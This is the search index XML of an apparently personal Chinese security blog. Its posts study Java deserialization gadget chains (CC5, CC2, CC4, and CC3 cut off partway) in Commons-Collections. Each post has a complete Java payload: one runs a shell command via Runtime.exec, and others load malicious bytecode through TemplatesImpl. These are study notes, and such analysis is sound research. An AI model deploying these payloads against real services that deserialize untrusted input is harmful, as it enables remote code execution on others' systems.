<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java反序列化之CC5</title>
    <link href="/2025/04/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC5/"/>
    <url>/2025/04/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC5/</url>
    
    <content type="html"><![CDATA[<h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>参考：<a href="https://www.cnblogs.com/1vxyz/p/17473581.html">https://www.cnblogs.com/1vxyz/p/17473581.html</a><br>环境：<code>jdk8u65 &amp;&amp; Commons-collections 3.2.1</code><br>适用：需要SecurityManager关闭（默认关闭）jdk11也可利用 jdk15失败<br>实际上是CC1_LazyMap的一个变种 所以没通过恶意类加载 而是Runtime命令执行 和CC6的TiedMapEntry::hashCode()触发不同 CC5用的是TiedMapEntry::toString()</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">Gadget chain:<br>    ObjectInputStream.readObject() -&gt;<br>        BadAttributeValueExpException.readObject() -&gt;<br>            TiedMapEntry.toString() -&gt;<br>                LazyMap.get() -&gt;<br>                    ChainedTransformer.transform() -&gt;<br>                        ConstantTransformer.transform() -&gt;<br>                        InvokerTransformer.trnansform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Class.getMethod() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Runtime.getRuntime() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Runtime.exec()<br></code></pre></td></tr></table></figure><p><img src="/img/cc5/17440923339155.png"><br>可以看到toString()会调用getValue() 和上面的hashCode()是一样的<br>接下来就是找哪里调用了toString() 由于有点多 所以直接上作者找到的<code>BadAttributeValueExpException</code><br><img src="/img/cc5/17440925664402.png"><br>根据BadAttributeValueExpException::readObject()的逻辑 我们只需要实例化一个BadAttributeValueExpException实例 然后反射修改它唯一的属性val的值就可以了<br><img src="/img/cc5/17440926678718.png"><br>因为实例化的时候就会调用toString() 所以最好还是反射修改 这样更加直观<br>payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;touch aaa&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">//tiedMapEntry.toString();</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">// serialize(badAttributeValueExpException);</span><br>        unserialize(<span class="hljs-string">&quot;sercc5.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;sercc5.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化之CC2</title>
    <link href="/2025/04/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC2/"/>
    <url>/2025/04/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC2/</url>
    
    <content type="html"><![CDATA[<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>参考：<a href="https://www.cnblogs.com/1vxyz/p/17478613.html">https://www.cnblogs.com/1vxyz/p/17478613.html</a><br>环境：<code>jdk8u65 &amp;&amp; Commons-collections 4.0</code><br>适用：jdk8u301 jdk11 jdk15可利用 jdk16失败<br>CC2实际上是CC4的一个变种 由于还是要通过恶意类加载来rce 所以顺着来还是得调用TemplatesImpl::newTransformer() 但是因为是commons-collections4.0 所以前面可以不用<code>ChainedTransformer::compare() -&gt; InstantiateTransformer::transform() -&gt; TrAXFilter::TrAXFilter()</code>这么麻烦 直接使用InvokerTransformer此时还能够序列化的特性invoke调用就行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">Gadget chain:<br>    PriorityQueue::readObject() -&gt;<br>        PriorityQueue::heapify() -&gt;<br>            PriorityQueue::siftDown() -&gt;<br>                PriorityQueue::siftDownUsingComparator() -&gt;<br>                    TransformingComparator::compare() -&gt;<br>                        InvokerTransformer::transform() -&gt;<br>                            TemplatesImpl::newTransformer() -&gt;<br>                                TemplatesImpl::getTransletInstance() -&gt;<br>                                    TemplatesImpl::defineTransletClasses() -&gt;<br>                                        TransletClassLoader::defineClass()<br></code></pre></td></tr></table></figure><p>这里要注意的是CC2相比CC4的变化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// CC4</span><br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>        instantiateTransformer<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br><br><span class="hljs-comment">// CC2</span><br>InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>priorityQueue.add(templates);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>可以看到CC4是将templates赋给InstantiateTransformer 整个ChainedTransformer数组中的每个Transformer都调用一遍transform() 最后将templates当作参数传给TrAXFilter使其调用templates.newTransformer()</p><p>而CC2则是将templates赋给PriorityQueue 随后传给InvokerTransformer 通过InvokerTransformer的trasnform() 将<code>newTransformer</code>当作参数传给templates使其调用templates.newTransformer()<br>payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;jed&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;target/classes/evil.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br><br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//transformingComparator.compare(1,2);</span><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        setFieldValue(transformingComparator,<span class="hljs-string">&quot;transformer&quot;</span>,invokerTransformer);<br>        <span class="hljs-comment">// serialize(priorityQueue);</span><br>        unserialize(<span class="hljs-string">&quot;sercc2.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object,String field_name,Object filed_value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        Class clazz=object.getClass();<br>        Field declaredField=clazz.getDeclaredField(field_name);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(object,filed_value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;sercc2.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以说CC2最大的区别实际上就是没有用Transformer数组</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化之CC4</title>
    <link href="/2025/04/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC4/"/>
    <url>/2025/04/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC4/</url>
    
    <content type="html"><![CDATA[<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>参考：<a href="https://www.cnblogs.com/1vxyz/p/17473641.html">https://www.cnblogs.com/1vxyz/p/17473641.html</a><br>环境：<code>jdk8u65 &amp;&amp; Commons-collections 4.0</code><br>CommonsCollections4除4.0的其他版本InvokerTransformer不再继承Serializable<br>但是TransformingComparator继承了Serializable 但是Commons-collections3里没有<br>CC4链子sink点也是definClass加载恶意类 所以后半段可以沿用CC3来<br>前半段找transform调用 最后找到了PriorityQueue优先队列里<br>链子如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">Gadget chain:<br>    PriorityQueue::readObject() -&gt;<br>        PriorityQueue::heapify() -&gt;<br>            PriorityQueue::siftDown() -&gt;<br>                PriorityQueue::siftDownUsingComparator() -&gt;<br>                    TransformingComparator::compare() -&gt;<br>                        ChainedTransformer::transform() -&gt;<br>                            ConstantTransformer::transform() -&gt;<br>                            InstantiateTransformer::transform -&gt;<br>                                TrAXFilter::TrAXFilter() -&gt;<br>                                    TemplatesImpl::newTransformer() -&gt;<br>                                        TemplatesImpl::getTransletInstance() -&gt;<br>                                            TemplatesImpl::defineTransletClasses() -&gt;<br>                                                TransletClassLoader::defineClass()<br></code></pre></td></tr></table></figure><p>跟着链来的话只需要考虑一个问题<br><img src="/img/cc4/17439353383470.png"><br>这里我们需要进循环触发siftDown() 而初始的size是0 所以这里需要给queue再add两个元素 让循环能进去<br>这里我试了<code>setFieldValue(priorityQueue,&quot;size&quot;,2);</code>也能加载恶意类<br>如果调用add()的话 得考虑别在序列化数据的时候就触发了 所以得先用ConstantTransformer占个位<br>payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;jed&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;target/classes/evil.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br><br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">// TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//transformingComparator.compare(1,2);</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        <span class="hljs-comment">// setFieldValue(priorityQueue,&quot;size&quot;,2);</span><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        setFieldValue(transformingComparator,<span class="hljs-string">&quot;transformer&quot;</span>,chainedTransformer);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;sercc4.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object,String field_name,Object filed_value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        Class clazz=object.getClass();<br>        Field declaredField=clazz.getDeclaredField(field_name);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(object,filed_value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;sercc4.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化之CC3</title>
    <link href="/2025/04/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC3/"/>
    <url>/2025/04/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC3/</url>
    
    <content type="html"><![CDATA[<h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>参考：<a href="https://www.cnblogs.com/1vxyz/p/17458691.html">https://www.cnblogs.com/1vxyz/p/17458691.html</a><br>环境：<code>jdk8u65 &amp;&amp; Commons-collections 3.2.1</code><br>CC1和CC6都是利用invoke反射调用Runtime.getRuntime.exec()来执行命令<br>而CC3则是利用类加载机制 动态加载恶意类自动执行恶意类的代码<br>CC3 based on TemplatesImpl类加载 所以我们得先找TemplatesImpl的链子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">InstantiateTransformer.transform -&gt;<br>    TrAXFilter::TrAXFilter() -&gt;<br>        TemplatesImpl::newTransformer() -&gt;<br>            TemplatesImpl::getTransletInstance() -&gt;<br>                TemplatesImpl::defineTransletClasses() -&gt;<br>                    TransletClassLoader::defineClass()<br></code></pre></td></tr></table></figure><p>我们挑要条件的讲讲<br><img src="/img/cc3/17439240908673.png"><br>为了满足条件 _name不能为空 _class要为空 这样就能进到defineTransletClasses()<br><img src="/img/cc3/17439243272931.png"><br>为了满足条件 <code>_bytecodes</code>不能为空 而且<code>_bytecodes</code>正是我们要加载恶意类代码的地方<br>这里需要的是byte[][] 但是传入defineClass的是一个一维数组 我们可以按照如下方法赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;evil.class&quot;</span>));  <br><span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br></code></pre></td></tr></table></figure><p>同时_tfactory也不能为空 而且其带了transient属性 无法写进序列化数据 这个后面readObject里会给它赋值<br>这边还有一个空指针异常的问题<br><img 